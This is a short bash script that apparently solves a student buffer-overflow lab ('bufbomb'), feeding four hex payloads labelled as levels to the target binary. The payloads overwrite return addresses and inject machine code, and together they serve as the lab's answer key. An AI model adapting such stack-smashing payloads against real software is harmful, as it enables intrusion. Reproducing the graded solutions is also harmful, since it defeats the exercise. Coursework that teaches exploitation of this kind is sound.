#!/bin/bash
STUDENT=720028
EXE=./bufbomb.exe

echo "========== 第1关 =========="
echo "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 F0 11 40 00" | $EXE $STUDENT

echo ""
echo "========== 第2关 =========="
echo "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 10 12 40 00 00 00 00 00 A6 26 34 2F" | $EXE $STUDENT

echo ""
echo "========== 第3关 =========="
echo "A1 00 90 40 00 A3 04 90 40 00 68 60 12 40 00 C3 24 FE 1A 00" | $EXE $STUDENT

echo ""
echo "========== 第4关 =========="
echo "E9 27 00 00 00 00 00 00 00 00 00 00 48 FE 1A 00 24 FE 1A 00 60 FE 1A 00 00 00 00 00 00 00 00 00 EF BE AD DE 3C FF 1A 00 0D 14 40 00 A1 00 90 40 00 A3 04 90 40 00 68 B0 12 40 00 C3 B8 A6 26 34 2F E9 17 13 25 00" | $EXE $STUDENT
